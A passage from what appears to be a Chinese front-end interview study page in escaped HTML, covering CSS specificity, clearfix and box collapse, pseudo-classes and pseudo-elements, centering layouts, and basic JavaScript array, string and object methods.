punctuation\">\"</span>css/style.css<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>选择器类型</p>\n<ul>\n<li>1、ID　　#id</li>\n<li>2、class　　.class</li>\n<li>3、标签　　p</li>\n<li>4、通用　　*</li>\n<li>5、属性　　[type&#x3D;”text”]</li>\n<li>6、伪类　　:hover</li>\n<li>7、伪元素　　::first-line</li>\n<li>8、子选择器、相邻选择器</li>\n</ul>\n<p>权重计算规则</p>\n<p>第一等：代表内联样式，如: style&#x3D;””，权值为1000。<br>第二等：代表ID选择器，如：#content，权值为0100。<br>第三等：代表类，伪类和属性选择器，如.content，权值为0010。<br>第四等：代表类型选择器和伪元素选择器，如div p，权值为0001。<br>通配符、子选择器、相邻选择器等的。如*、&gt;、+,权值为0000。<br>继承的样式没有权值。</p>\n<p>比较规则</p>\n<p>遵循如下法则：</p>\n<ul>\n<li>选择器都有一个权值，权值越大越优先；</li>\n<li>当权值相等时，后出现的样式表设置要优于先出现的样式表设置；</li>\n<li>创作者的规则高于浏览者：即网页编写者设置的 CSS 样式的优先权高于浏览器所设置的样式；</li>\n<li>继承的 CSS 样式不如后来指定的 CSS 样式；</li>\n<li>在同一组属性设置中标有!important规则的优先级最大</li>\n<li>通配符、子选择器、相邻选择器等的。虽然权值为0000，但是也比继承的样式优先。</li>\n</ul>\n<p>！important</p>\n<ol>\n<li>!important 的作用是提升优先级，换句话说。加了这句的样式的优先级是最高的（比内联样式的优先级还高)。</li>\n</ol>\n<pre class=\"line-numbers language-xml\" data-language=\"xml\"><code class=\"language-xml\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span> \np&#123;\n    color:red !important;\n&#125; \n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>color:blue;<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>我显示红色<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li>ie7+和别的浏览器对important的这种作用的支持度都很好。只有ie6有些bug</li>\n</ol>\n<pre class=\"line-numbers language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\">p<span class=\"token punctuation\">&#123;</span>\n      color<span class=\"token operator\">:</span>red <span class=\"token operator\">!</span>important<span class=\"token punctuation\">;</span>\n      color<span class=\"token operator\">:</span>blue<span class=\"token punctuation\">;</span>    \n <span class=\"token punctuation\">&#125;</span><span class=\"token comment\">//会显示blue</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>但是这并不说明ie6不支持important，只是支持上有些bug。看下面</p>\n<pre class=\"line-numbers language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\">p<span class=\"token punctuation\">&#123;</span>\n     color<span class=\"token operator\">:</span>red <span class=\"token operator\">!</span>important<span class=\"token punctuation\">;</span>  \n<span class=\"token punctuation\">&#125;</span>\np<span class=\"token punctuation\">&#123;</span>\n    color<span class=\"token operator\">:</span>blue<span class=\"token punctuation\">;</span>  \n<span class=\"token punctuation\">&#125;</span> <span class=\"token comment\">//这样就会显示的是red。说明ie6还是支持important的。&lt;/pre></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"12、盒子塌陷是什么？\"><a href=\"#12、盒子塌陷是什么？\" class=\"headerlink\" title=\"12、盒子塌陷是什么？\"></a>12、盒子塌陷是什么？</h3><p><strong>参考答案：</strong></p>\n<p><strong>盒子塌陷</strong></p>\n<p>本应该在父盒子内部的元素跑到了外部。</p>\n<p>原因：</p>\n<p>当父元素没设置足够大小的时候，而子元素设置了浮动的属性，子元素就会跳出父元素的边界（脱离文档流），尤其是当父元素的高度为auto时，而父元素中又没有其它非浮动的可见元素时，父盒子的高度就会直接塌陷为零， 我们称这是<strong>CSS高度塌陷</strong>。</p>\n<p><strong>关于盒子塌陷的几种解决方法</strong></p>\n<p>（1）最简单，直接，粗暴的方法就是盒子大小写死，给每个盒子设<strong>定固定的width和height</strong>，直到合适为止，这样的好处是简单方便，兼容性好，适合只改动少量内容不涉及盒子排布的版面。缺点是非自适应，浏览器的窗口大小直接影响用户体验。</p>\n<p>（2）给外部的父盒子也添加浮动，让其也脱离标准文档流，这种方法方便，但是对页面的布局不是很友好，不易维护。</p>\n<p>（3）给父盒子添加overflow属性。</p>\n<p> overflow:auto; 有可能出现滚动条，影响美观。</p>\n<p> overflow:hidden; 可能会带来内容不可见的问题。</p>\n<p>（4）父盒子里最下方引入清除浮动块。最简单的有：</p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">clear</span><span class=\"token punctuation\">:</span>both<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">/></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>有很多人是这么解决的，但是我们并不推荐，因为其引入了不必要的冗余元素 。</p>\n<p> (5)用after伪元素清除浮动</p>\n<p>给外部盒子的after伪元素设置clear属性，再隐藏它</p>\n<p>这其实是对空盒子方案的改进，一种纯CSS的解决方案，不用引入冗余元素。</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">.clearfix</span> <span class=\"token punctuation\">&#123;</span>*<span class=\"token property\">zoom</span><span class=\"token punctuation\">:</span> 1<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token selector\">.clearfix:before,.clearfix:after</span> <span class=\"token punctuation\">&#123;</span>\n\n<span class=\"token property\">display</span><span class=\"token punctuation\">:</span> table<span class=\"token punctuation\">;</span>\n\n<span class=\"token property\">line-height</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n\n<span class=\"token property\">content</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token selector\">.clearfix:after</span> <span class=\"token punctuation\">&#123;</span><span class=\"token property\">clear</span><span class=\"token punctuation\">:</span> both<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这也是bootstrap框架采用的清除浮动的方法。</p>\n<p>这是一种纯CSS的解决浮动造成盒子塌陷方法，没有引入任何冗余元素，推荐使用此方法来解决CSS盒子塌陷。</p>\n<p>备注：第五种方法虽好，但是低版本IE不兼容，具体选择哪种解决方法，可根据实际情况决定。</p>\n<p>(6) 给父盒子添加border</p>\n<p>(7) 给父盒子设置padding-top</p>\n<h3 id=\"13、css-伪类与伪元素区别\"><a href=\"#13、css-伪类与伪元素区别\" class=\"headerlink\" title=\"13、css 伪类与伪元素区别\"></a>13、css 伪类与伪元素区别</h3><p><strong>参考答案</strong>：</p>\n<ol>\n<li>伪类(pseudo-classes)</li>\n</ol>\n<ul>\n<li>其核⼼就是⽤来选择DOM树之外的信息,不能够被普通选择器选择的⽂档之外的元素，⽤来添加⼀些选择器的特殊效果。</li>\n<li>⽐如:hover :active :visited :link :visited :first-child :focus :lang等</li>\n<li>由于状态的变化是⾮静态的，所以元素达到⼀个特定状态时，它可能得到⼀个伪类的样式；当状态改变时，它⼜会失去这个样式。</li>\n<li>由此可以看出，它的功能和class有些类似，但它是基于⽂档之外的抽象，所以叫 伪类。</li>\n</ul>\n<ol>\n<li>伪元素(Pseudo-elements)</li>\n</ol>\n<ul>\n<li>DOM树没有定义的虚拟元素</li>\n<li>核⼼就是需要创建通常不存在于⽂档中的元素，</li>\n<li>⽐如::before ::after 它选择的是元素指定内容，表示选择元素内容的之前内容或之后内容。</li>\n<li>伪元素控制的内容和元素是没有差别的，但是它本身只是基于元素的抽象，并不存在于⽂档中，所以称为伪元素。⽤于将特殊的效果添加到某些选择器</li>\n</ul>\n<ol>\n<li>伪类与伪元素的区别</li>\n</ol>\n<ul>\n<li>表示⽅法<ul>\n<li>CSS2 中伪类、伪元素都是以单冒号:表示,</li>\n<li>CSS2.1 后规定伪类⽤单冒号表示,伪元素⽤双冒号::表示，</li>\n<li>浏览器同样接受 CSS2 时代已经存在的伪元素(:before, :after, :first�line, :first-letter 等)的单冒号写法。</li>\n<li>CSS2 之后所有新增的伪元素(如::selection)，应该采⽤双冒号的写法。</li>\n<li>CSS3中，伪类与伪元素在语法上也有所区别，伪元素修改为以::开头。浏览器对以:开头的伪元素也继续⽀持，但建议规范书写为::开头</li>\n</ul>\n</li>\n<li>定义不同<ul>\n<li>伪类即假的类，可以添加类来达到效果</li>\n<li>伪元素即假元素，需要通过添加元素才能达到效果</li>\n</ul>\n</li>\n<li>总结:<ul>\n<li>伪类和伪元素都是⽤来表示⽂档树以外的”元素”。</li>\n<li>伪类和伪元素分别⽤单冒号:和双冒号::来表示。</li>\n<li>伪类和伪元素的区别，关键点在于如果没有伪元素(或伪类)，</li>\n<li>是否需要添加元素才能达到效果，如果是则是伪元素，反之则是伪类</li>\n<li>伪类和伪元素都不出现在源⽂件和DOM树中。也就是说在html源⽂件中是看不到伪类和伪元素的。</li>\n<li>伪类其实就是基于普通DOM元素⽽产⽣的不同状态，他是DOM元素的某⼀特征。</li>\n<li>伪元素能够创建在DOM树中不存在的抽象对象，⽽且这些抽象对象是能够访问到的。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"14、行内元素的margin-和-padding\"><a href=\"#14、行内元素的margin-和-padding\" class=\"headerlink\" title=\"14、行内元素的margin 和 padding\"></a>14、行内元素的margin 和 padding</h3><p><strong>参考答案：</strong></p>\n<ul>\n<li>水平方向：水平方向上，都有效；</li>\n<li>垂直方向：垂直方向上，都无效；（<code>padding-top</code> 和 <code>padding-bottom</code> 会显示出效果，但是高度不会撑开，不会对周围元素有影响）</li>\n</ul>\n<h3 id=\"15、min-width-x2F-max-width-和-min-height-x2F-max-height-属性间的覆盖规则？\"><a href=\"#15、min-width-x2F-max-width-和-min-height-x2F-max-height-属性间的覆盖规则？\" class=\"headerlink\" title=\"15、min-width&#x2F;max-width 和 min-height&#x2F;max-height 属性间的覆盖规则？\"></a>15、min-width&#x2F;max-width 和 min-height&#x2F;max-height 属性间的覆盖规则？</h3><p><strong>参考答案</strong>：</p>\n<ol>\n<li>max-width 会覆盖 width，即使 width 是行内样式或者设置了 !important。</li>\n<li>min-width 会覆盖 max-width，此规则发生在 min-width 和 max-width 冲突的时候；</li>\n</ol>\n<h3 id=\"16、未知高度元素垂直居中、水平居中的实现方式有哪些？\"><a href=\"#16、未知高度元素垂直居中、水平居中的实现方式有哪些？\" class=\"headerlink\" title=\"16、未知高度元素垂直居中、水平居中的实现方式有哪些？\"></a>16、未知高度元素垂直居中、水平居中的实现方式有哪些？</h3><p><strong>参考答案：</strong></p>\n<p><strong>1、绝对定位+css3 transform:translate(-50%，-50%)</strong></p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">.wrap</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">position</span><span class=\"token punctuation\">:</span>relative<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token selector\">.child</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> absolute<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">top</span><span class=\"token punctuation\">:</span>50%<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">left</span><span class=\"token punctuation\">:</span>50%<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">-webkit-transform</span><span class=\"token punctuation\">:</span><span class=\"token function\">translate</span><span class=\"token punctuation\">(</span>-50%<span class=\"token punctuation\">,</span>-50%<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>2、css3 的flex布局</strong></p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">.wrap</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">display</span><span class=\"token punctuation\">:</span>flex<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">justify-content</span><span class=\"token punctuation\">:</span>center<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token selector\">.child</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">align-self</span><span class=\"token punctuation\">:</span>center<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>3、table布局</strong></p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">&lt;div class=\"wrap\">\n   &lt;div class=\"child\">\n          &lt;div>sadgsdgasgd&lt;/div>\n   &lt;/div>\n&lt;/div>\n.wrap</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">display</span><span class=\"token punctuation\">:</span>table<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">text-align</span><span class=\"token punctuation\">:</span>center<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token selector\">.child</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">background</span><span class=\"token punctuation\">:</span>#ccc<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">display</span><span class=\"token punctuation\">:</span>table-cell<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">vertical-align</span><span class=\"token punctuation\">:</span>middle<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token selector\">.child div</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span>300px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">height</span><span class=\"token punctuation\">:</span>150px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">background</span><span class=\"token punctuation\">:</span>red<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">margin</span><span class=\"token punctuation\">:</span>0 auto<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"Javascript\"><a href=\"#Javascript\" class=\"headerlink\" title=\"Javascript\"></a>Javascript</h2><h3 id=\"1、JS中的instanceof运算符\"><a href=\"#1、JS中的instanceof运算符\" class=\"headerlink\" title=\"1、JS中的instanceof运算符\"></a>1、JS中的instanceof运算符</h3><p>instanceof运算符用来判断一个构造函数的prototype属性所指向的对象是否存在另外一个要检测对象的原型链上</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">obj instanceof Object;&#x2F;&#x2F;true 实例obj在不在Object构造函数中<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>eg：</p>\n<p>请补全JavaScript函数，要求以Boolean的形式返回第一个参数是否属于第二个参数对象的实例。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">function _instanceof(left,right) &#123;\n    &#x2F;&#x2F; 补全代码\n    return (left instanceof right )\n    \n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"2、排序\"><a href=\"#2、排序\" class=\"headerlink\" title=\"2、排序\"></a>2、排序</h3><p>sort() 方法对数组的项目进行排序。</p>\n<p>按升序对数组中的数字进行排序：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">var points &#x3D; [40, 100, 1, 5, 25, 10];\npoints.sort(function(a, b)&#123;return a-b&#125;);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>按降序对数组中的数字进行排序：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">var points &#x3D; [40, 100, 1, 5, 25, 10];\npoints.sort(function(a, b)&#123;return b-a&#125;);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"3、JS字符串大写和小写之间的转换\"><a href=\"#3、JS字符串大写和小写之间的转换\" class=\"headerlink\" title=\"3、JS字符串大写和小写之间的转换\"></a>3、JS字符串大写和小写之间的转换</h3><p>String 字符串大小写转换方法</p>\n<table>\n<thead>\n<tr>\n<th>字符串方法</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>toLocaleLowerCase()</td>\n<td>把字符串转换成小写</td>\n</tr>\n<tr>\n<td>toLocaleUpperCase()</td>\n<td>将字符串转换成大写</td>\n</tr>\n<tr>\n<td>toLowerCase()</td>\n<td>将字符串转换成小写</td>\n</tr>\n<tr>\n<td>toUpperCase()</td>\n<td>将字符串转换成大写</td>\n</tr>\n</tbody></table>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> s <span class=\"token operator\">=</span> <span class=\"token string\">\"JavaScript\"</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span><span class=\"token function\">toUpperCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"4、javascript如何删除指定数组元素\"><a href=\"#4、javascript如何删除指定数组元素\" class=\"headerlink\" title=\"4、javascript如何删除指定数组元素\"></a>4、javascript如何删除指定数组元素</h3><ol>\n<li><p>使用delete关键字；</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">var colors &#x3D; [&quot;red&quot;, &quot;blue&quot;, &quot;grey&quot;, &quot;green&quot;];\ndelete colors[0];\nconsole.log(colors); &#x2F;&#x2F; [undefined, &quot;blue&quot;, &quot;grey&quot;, &quot;green&quot;]\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>使用delete删除元素之后数组长度不变，只是被删除元素被置为undefined了</strong></p>\n</li>\n<li><p>使用splice()操作方法；</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">var colors &#x3D; [&quot;red&quot;, &quot;blue&quot;, &quot;grey&quot;];\nvar color &#x3D; colors.splice(0, 1);\nconsole.log(color); &#x2F;&#x2F; &quot;red&quot;\nconsole.log(colors); &#x2F;&#x2F; [&quot;blue&quot;, &quot;grey&quot;]<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在删除数组元素的时候，它可以删除任意数量的项，只需要指定2个参数：要删除的第一项的位置和要删除的项数。</p>\n</li>\n<li><p>迭代方法，用循环迭代数组元素，发现符合要删除的项则删除；</p>\n<p>第一种用最常见的ForEach循环来对比元素找到之后将其删除。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">var colors &#x3D; [&quot;red&quot;, &quot;blue&quot;, &quot;grey&quot;];\n\n \n\ncolors.forEach(function(item, index, arr) &#123;    if(item &#x3D;&#x3D;&#x3D; &quot;red&quot;) &#123;\n\n        arr.splice(index, 1);\n\n    &#125;\n\n&#125;)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">var colors &#x3D; [&quot;red&quot;, &quot;blue&quot;, &quot;grey&quot;];\n\n \n\ncolors &#x3D; colors.filter(function(item) &#123;    return item !&#x3D; &quot;red&quot;&#125;);\n\n  \n\nconsole.log(colors); &#x2F;&#x2F; [&quot;blue&quot;, &quot;grey&quot;]<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n</li>\n<li><p>prototype原型方法，在Array的原型上添加方法来达到删除的目的。</p>\n</li>\n</ol>\n<h3 id=\"5、数组方法\"><a href=\"#5、数组方法\" class=\"headerlink\" title=\"5、数组方法\"></a>5、数组方法</h3><h4 id=\"数组方法概括\"><a href=\"#数组方法概括\" class=\"headerlink\" title=\"数组方法概括\"></a>数组方法概括</h4><table>\n<thead>\n<tr>\n<th>方法名</th>\n<th align=\"left\">对应版本</th>\n<th align=\"left\">功能</th>\n<th align=\"left\">原数组是否改变</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>concat()</td>\n<td align=\"left\">ES5-</td>\n<td align=\"left\">合并数组，并返回合并之后的数据</td>\n<td align=\"left\">n</td>\n</tr>\n<tr>\n<td>join()</td>\n<td align=\"left\">ES5-</td>\n<td align=\"left\">使用分隔符，将数组转为字符串并返回</td>\n<td align=\"left\">n</td>\n</tr>\n<tr>\n<td>pop()</td>\n<td align=\"left\">ES5-</td>\n<td align=\"left\">删除最后一位，并返回删除的数据</td>\n<td align=\"left\">y</td>\n</tr>\n<tr>\n<td>shift()</td>\n<td align=\"left\">ES5-</td>\n<td align=\"left\">删除第一位，并返回删除的数据</td>\n<td align=\"left\">y</td>\n</tr>\n<tr>\n<td>unshift()</td>\n<td align=\"left\">ES5-</td>\n<td align=\"left\">在第一位新增一或多个数据，返回长度</td>\n<td align=\"left\">y</td>\n</tr>\n<tr>\n<td>push()</td>\n<td align=\"left\">ES5-</td>\n<td align=\"left\">在最后一位新增一或多个数据，返回长度</td>\n<td align=\"left\">y</td>\n</tr>\n<tr>\n<td>reverse()</td>\n<td align=\"left\">ES5-</td>\n<td align=\"left\">反转数组，返回结果</td>\n<td align=\"left\">y</td>\n</tr>\n<tr>\n<td>slice()</td>\n<td align=\"left\">ES5-</td>\n<td align=\"left\">截取指定位置的数组，并返回</td>\n<td align=\"left\">n</td>\n</tr>\n<tr>\n<td>sort()</td>\n<td align=\"left\">ES5-</td>\n<td align=\"left\">排序（字符规则），返回结果</td>\n<td align=\"left\">y</td>\n</tr>\n<tr>\n<td>splice()</td>\n<td align=\"left\">ES5-</td>\n<td align=\"left\">删除指定位置，并替换，返回删除的数据</td>\n<td align=\"left\">y</td>\n</tr>\n<tr>\n<td>toString()</td>\n<td align=\"left\">ES5-</td>\n<td align=\"left\">直接转为字符串，并返回</td>\n<td align=\"left\">n</td>\n</tr>\n<tr>\n<td>valueOf()</td>\n<td align=\"left\">ES5-</td>\n<td align=\"left\">返回数组对象的原始值</td>\n<td align=\"left\">n</td>\n</tr>\n<tr>\n<td>indexOf()</td>\n<td align=\"left\">ES5</td>\n<td align=\"left\">查询并返回数据的索引</td>\n<td align=\"left\">n</td>\n</tr>\n<tr>\n<td>lastIndexOf()</td>\n<td align=\"left\">ES5</td>\n<td align=\"left\">反向查询并返回数据的索引</td>\n<td align=\"left\">n</td>\n</tr>\n<tr>\n<td>forEach()</td>\n<td align=\"left\">ES5</td>\n<td align=\"left\">参数为回调函数，会遍历数组所有的项，回调函数接受三个参数，分别为value，index，self；forEach没有返回值</td>\n<td align=\"left\">n</td>\n</tr>\n<tr>\n<td>map()</td>\n<td align=\"left\">ES5</td>\n<td align=\"left\">同forEach，同时回调函数返回数据，组成新数组由map返回</td>\n<td align=\"left\">n</td>\n</tr>\n<tr>\n<td>filter()</td>\n<td align=\"left\">ES5</td>\n<td align=\"left\">同forEach，同时回调函数返回布尔值，为true的数据组成新数组由filter返回</td>\n<td align=\"left\">n</td>\n</tr>\n<tr>\n<td>every()</td>\n<td align=\"left\">ES5</td>\n<td align=\"left\">同forEach，同时回调函数返回布尔值，全部为true，由every返回true</td>\n<td align=\"left\">n</td>\n</tr>\n<tr>\n<td>some()</td>\n<td align=\"left\">ES5</td>\n<td align=\"left\">同forEach，同时回调函数返回布尔值，只要由一个为true，由some返回true</td>\n<td align=\"left\">n</td>\n</tr>\n<tr>\n<td>reduce()</td>\n<td align=\"left\">ES5</td>\n<td align=\"left\">归并，同forEach，迭代数组的所有项，并构建一个最终值，由reduce返回</td>\n<td align=\"left\">n</td>\n</tr>\n<tr>\n<td>reduceRight()</td>\n<td align=\"left\">ES5</td>\n<td align=\"left\">反向归并，同forEach，迭代数组的所有项，并构建一个最终值，由reduceRight返回</td>\n<td align=\"left\">n</td>\n</tr>\n</tbody></table>\n<p><strong>用slice(0)复制一个数组</strong></p>\n<p><strong>a.splice(index,0,item)：在数组a的第index位置插入item</strong></p>\n<p><strong>最大值 ;Math.max.apply(Math,array)</strong></p>\n<h3 id=\"6、对象\"><a href=\"#6、对象\" class=\"headerlink\" title=\"6、对象\"></a>6、对象</h3><h4 id=\"Number-对象\"><a href=\"#Number-对象\" class=\"headerlink\" title=\"Number 对象\"></a>Number 对象</h4><p>Number 对象是原始数值的包装对象，创建 Number 对象的语法格式如下：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">var myNum &#x3D; new Number(value);\nvar myNum &#x3D; Number(value);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>其中 value 为要创建的 Number 对象的数值，若 value 为一个非数字的值，则会尝试将其转换为数字，若转换失败则会返回 NaN。</p>\n<p>eg:请补全JavaScript函数，要求将数字参数转换为对象的形式返回。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">function _numbertoobject(number) &#123;\n    &#x2F;&#x2F; 补全代码\n    var myNum &#x3D; new Number(number);\n    return myNum\n    \n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"对象字符串\"><a href=\"#对象字符串\" class=\"headerlink\" title=\"对象字符串\"></a><strong>对象字符串</strong></h4><p>JavaScript String 对象用于处理字符串，其中提供了大量操作字符串的方法，以及一些属性。</p>\n<p>创建 String 对象的语法格式如下：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">var val &#x3D; new String(value);\nvar val &#x3D; String(value);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n\n\n\n\n\n\n\n\n\n\n\n\n<h4 id=\"对象属性遍历：\"><a href=\"#对象属性遍历：\" class=\"headerlink\" title=\"对象属性遍历：\"></a>对象属性遍历：</h4><ul>\n<li><p>使用 for in 循环遍历对象的属性时，<strong>原型链上的所有属性</strong>都将被访问：</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> obj<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string-property property\">\"name\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"wjy\"</span><span class=\"token punctuation\">,</span><span class=\"token string-property property\">\"age\"</span><span class=\"token operator\">:</span><span class=\"token number\">26</span><span class=\"token punctuation\">,</span><span class=\"token string-property property\">\"sex\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"female\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//定义一个object对象   </span>\n<span class=\"token keyword\">var</span> keys<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//定义一个数组用来接受key   </span>\n<span class=\"token keyword\">var</span> values<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//定义一个数组用来接受value   </span>\n  <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> key <span class=\"token keyword\">in</span> obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>   \n    keys<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   \n    values<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//取得value     </span>\n    <span class=\"token punctuation\">&#125;</span>   \n<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"keys is ：\"</span><span class=\"token operator\">+</span>keys<span class=\"token operator\">+</span><span class=\"token string\">\" and values is ：\"</span><span class=\"token operator\">+</span>values<span class=\"token 